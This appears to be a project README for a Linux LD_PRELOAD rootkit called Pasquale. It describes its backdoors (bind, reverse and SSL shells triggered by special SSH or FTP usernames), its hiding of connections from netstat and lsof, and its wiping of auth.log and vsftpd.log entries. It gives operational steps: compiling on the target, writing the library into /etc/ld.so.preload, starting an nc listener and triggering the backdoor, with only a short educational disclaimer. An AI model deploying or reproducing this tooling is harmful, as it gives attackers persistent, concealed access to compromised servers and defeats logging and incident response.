---

# Pasquale Rootkit

## Overview

Pasquale is a userland rootkit utilizing the `LD_PRELOAD` technique to hook system calls and provide various backdoor functionalities. It demonstrates several concepts spanning C programming, socket programming, openSSL, system calls, and various elements related to Linux. The rootkit targets `syslog` and `vsftpd`, triggering one of three possible backdoors. Any network connections made by the attacker are hidden from `netstat` and `lsof`. The rootkit also hides the attacker from logs that usually monitor SSH and FTP connections. 

## Features

- **Backdoor Access**: Provides two types of backdoors: bind shell, reverse shell, and SSL-encrypted shell, which can be triggered through both SSH and FTP.
- **Log Manipulation**: Hides specific log entries from `vsftpd.log` and `auth.log`.
- **Process Hiding**: Conceals specific connections from `netstat` and `lsof`.

## Installation

### Prerequisites

Ensure you have OpenSSL installed on your system. 

### Supported Distributions

- Ubuntu
- Debian
- Kali Linux
- Other Debian-based distributions

### Compilation

Compile the rootkit as a shared library on the target system:

```bash
gcc pasquale.c -fPIC -shared -D_GNU_SOURCE -o lib.pack.so.6 -ldl -lssl -lcrypto
```

### Deployment

This rootkit would be installed on a Linux server where an attacker would have root access. The steps below assume you have root access on the target system.

1. **Compile the Library on Target**: Follow the compilation step directly on the target system to create `lib.pack.so.6`.

2. **Configure `LD_PRELOAD`**: Add the library to `/etc/ld.so.preload`.

    ```bash
    echo "/path/to/lib.pack.so.6" > /etc/ld.so.preload
    ```

### Verification

Verify that the library is loaded:

```bash
ldd /bin/ls
```

Check that `lib.pack.so.6` is listed.

## Usage

### Starting a Listener

Start a listener on the attacker's machine:

```bash
nc -lvp 443
```

### Triggering the Backdoor

Use one of the special usernames to trigger the desired backdoor (bind, reverse, or SSL):

```bash
ssh BIND_USER@target
ssh REVERSE_USER@target
ssh OPENSSL_USER@target
```

Alternatively, these backdoors can also be triggered via FTP with the same usernames:

```bash
ftp target
# login with username BIND_USER, REVERSE_USER, or OPENSSL_USER
```

## Functionality Details

### System Call Hooking

- **write Hook**: Intercepts `write` calls to check for specific usernames. Depending on the username, it triggers a bind shell, reverse shell, or SSL-encrypted shell. The ssh and ftp processes both make write calls when a username is submitted. 
- **fopen Hook**: Intercepts `fopen` calls to hide entries from `/var/log/vsftpd.log` and certain network connections from `netstat` and `lsof`.
- **readdir Hook**: Intercepts directory reads to hide the rootkit's presence, including the `ls` command.

### Abuse of syslog and vsftpd

- **Syslog**: The rootkit hooks the `write` syscall to detect specific usernames logged by `syslog`. When detected, it triggers the appropriate backdoor, ensuring no logs are written.
- **vsftpd**: The `fopen` hook redirects writes to `/var/log/vsftpd.log` to `/dev/null`, ensuring the log file remains empty.

## Important Notes

- **Educational Purposes**: This rootkit is intended for educational purposes only. Do not use it for malicious activities.
- **System Impact**: Running this rootkit can have significant security implications. Use it in a controlled and legal environment.

## License

This project is licensed under the MIT License.

---
